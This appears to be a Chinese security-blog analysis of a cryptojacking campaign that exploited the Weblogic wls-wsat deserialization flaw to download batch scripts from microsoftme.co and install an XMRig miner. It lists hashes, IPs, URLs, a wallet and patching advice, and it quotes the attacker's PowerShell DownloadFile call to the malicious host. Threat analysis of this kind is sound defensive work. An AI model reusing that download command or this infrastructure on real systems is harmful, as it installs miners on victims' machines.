## **一、背景**

近期发现一起Weblogic wls-wsat反序列化漏洞利用攻击事件，利用该漏洞执行powershell系统命令，伪装矿池地址，不易被发现，静默下载猫池(c3pool.com)挖矿脚本，并执行脚本下载XMR挖矿程序并进行挖矿。

![](https://image.3001.net/images/20200816/1597570162.png!small)

猫池会在多种算法的N个币中，选择利润最高的币去挖，因此猫池收益高于只挖一个币的传统矿池。智能模块会根据某个币的交易所价格，交易所深度，挖矿难度（全网算力），挖矿难度变化，每块产出币数，每块间隔时间等因素计算当前哪个币的收益最高；猫池自主研发智能切币和交易引擎，实时地监控N个币的这些信息，可以动态地决定分配多少算力到某个币上。

##  **二、样本介绍**

样本基本信息：

样本| sha256| 内容  
---|---|---  
  
winxmr.bat

|

963E0120148A98CC68812A03C6C396938740CDA57E8CFC5C990BA1314B54DA94

|

配置矿池脚本  
  
proxy.bat

| 6903b5ac0a5454c5a2d1123c754b3a38bb9dbcd56d6e601af0f2025ecff0f384|

安装挖矿木马脚本  
  
7za.exe

|

984D5D216572BD31E2A4F90E8AD3E380704FE7D966196B709FE084553A1B629C

|

解压工具  
  
WinRing0x64.sys

|

11BD2C9F9E2397C9A16E0990E4ED2CF0679498FE0FD418A3DFDAC60B5C160EE5

|

Win挖矿配置文件  
  
xmrig.exe

|

15549C2DFB53B127A311394629E90F3B8F3035B3D69A0BA27DA5929BD1037522

|

XMR挖矿程序  
  
##  **三、详细分析**

攻击者利用Weblogic wls-wsat反序列化漏洞（CVE-2017-3506）进行powershell命令执行攻击，伪装矿产地址，以便不易被发现。

![](https://image.3001.net/images/20200816/1597567967.png!small)

图 3-1 Weblogic wls-wsat反序列化漏洞攻击

Weblogic wls-wsat反序列化漏洞分析在此不做说明，大家可以查相关资料。执行漏洞攻击之后，通过DownloadFile('http://www.microsoftme.co/winxmr.bat','winxmr.bat')
powershell命令winxmr.bat脚本，脚本内容如下：

![](https://image.3001.net/images/20200816/1597566542.png!small)

图 3-2 winxmr.bat配置矿池钱包地址

主要作用是设置矿池钱包地址：468v7uCu8pQfuMtzbDnPbgLfvvMs6U2oY3RZdVwFdXv3fgdd92qfaEW8jFwgW3iZLHXkbXT2pzveKCcbwdhYoJgXHVWUvWb，并下载挖矿脚本。

proxy.bat脚本包含的内容如下，该脚本的主要任务是下载XMR挖矿程序，并进行挖矿程序的解压和相关配置设置。

![](https://image.3001.net/images/20200816/1597566574.png!small)

图 3-3 下载挖矿程序脚本

通过对比该脚本和官方的setup_c3pool_miner.bat（http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.bat）脚本，发现矿池地址不是mine.c3pool.com:13333，而是xmr.microsoftme.co:13333。

![](https://image.3001.net/images/20200816/1597567151.png!small)

图 3-4 矿池地址

此外发现proxy.bat删除了pause，这样挖矿程序执行完后自动退出DOS环境，感使得染用户不易察觉。

![](https://image.3001.net/images/20200816/1597567292.png!small)

图3-5 设置DOS自动退出

流量分析发现下载了挖矿程序压缩包。

![](https://image.3001.net/images/20200816/1597566611.png!small)

图 3-6 下载挖坑程序

通过分析xmrig.zip，基于修改日志发现该木马程序的生成时间为2020年8月2日。

![](https://image.3001.net/images/20200816/1597566640.png!small)

图3-7 microsoftme.co挖矿生成时间

该矿机还下载了解压工具7za.exe,解压xmrig.zip压缩文件。

![](https://image.3001.net/images/20200816/1597566676.png!small)

图 3-8 下载7zip解压工具

矿机配置文件config.json如下：

![](https://image.3001.net/images/20200816/1597566692.png!small)

图 3-9 config配置文件信息

通过挖矿钱包地址发现0.074925 XMR，已支付1.270199 XMR。

目前有39个矿工执行挖矿程序，这些矿工很可能都是被植入了挖矿木马的失陷主机。

![](https://image.3001.net/images/20200816/1597566721.png!small)

图 3-10 挖坑牟利信息

此外，在该平台上还发现了一键挖矿安装脚本，包含window版本和linux版本。

![](https://image.3001.net/images/20200816/1597566736.png!small)

图 3-11 多平台一键挖坑命令

##  **四、加固建议**

 **Weblogic 漏洞修复：**

1.升级Oracle 补丁。  
[http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html
](http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html)

<https://lipeng1943.com/download/weblogic_patch-catalog_25504.zip>

2.对访问wls-wsat的资源进行访问控制。  
3.临时解决方案  
在不影响业务前提下，根据实际环境路径，删除WebLogic程序下列war包及目录。

rm -f/home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war  
rm
-f/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war  
rm
-rf/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat  
---  
  
##  **五、相关** **IOC**

### sh256：

> 963E0120148A98CC68812A03C6C396938740CDA57E8CFC5C990BA1314B54DA94
>
> 6903b5ac0a5454c5a2d1123c754b3a38bb9dbcd56d6e601af0f2025ecff0f384
>
> 11BD2C9F9E2397C9A16E0990E4ED2CF0679498FE0FD418A3DFDAC60B5C160EE5
>
> 15549C2DFB53B127A311394629E90F3B8F3035B3D69A0BA27DA5929BD1037522

### IP：

> 8.210.206.43
>
> 172.67.219.131
>
> 104.18.53.20

### URL：

> http://www.microsoftme.co/winxmr.bat
>
> http://microsoftme.co/proxy.bat
>
> http://download.c3pool.com/xmrig_setup/raw/master/xmrig.zip

